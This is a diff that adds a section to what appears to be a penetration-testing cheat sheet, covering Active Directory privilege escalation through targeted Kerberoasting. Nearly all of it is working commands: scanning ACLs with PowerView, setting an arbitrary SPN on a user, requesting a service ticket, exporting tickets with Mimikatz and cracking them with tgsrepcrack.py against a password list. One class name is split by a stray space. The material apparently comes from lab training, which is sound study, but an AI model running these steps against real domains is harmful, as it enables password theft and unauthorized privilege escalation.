@@ -529,3 +529,42 @@ OR using ActiveDirectory module:
 ```Get-DomainUser -PreauthNotRequired -Verbose```
 
 # Privilege Escalation - Target a User via Kerberoasting Set-SPN
+
+```Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}```
+
+Check if the user already has an SPN:
+```Get-DomainUser -Identity supportuser | select serviceprincipalname```
+
+OR using ActiveDirectory module:
+```Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName```
+
+#### Set arbitrary SPN for user
+
+•  Set a SPN for the user (must be unique for the domain)
+```Set-DomainObject -Identity support1user -Set @{serviceprincipalname='ops/whatever1'}```
+
+OR using ActiveDirectory module:
+Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='ops/whatever1'}
+
+#### Request a TGS now the user has an SPN 
+
+```
+Add-Type -AssemblyNAme System.IdentityModel
+
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityTok en -ArgumentList "ops/whatever1"
+```
+
+OR 
+
+```Get-DomainSPNTicket -SPN ops/whatever1```
+
+#### Check, export, and crack the ticket
+```klist.exe```
+
+```Invoke-Mimikatz -Command '"kerberos::list /export"'```
+
+```
+python.exe .\tgsrepcrack.py .\10k-passwords.txt '.\2-
+40a10000-student1@ops~whatever1- dollarcorp.moneycorp.LOCAL.kirbi'
+```
+
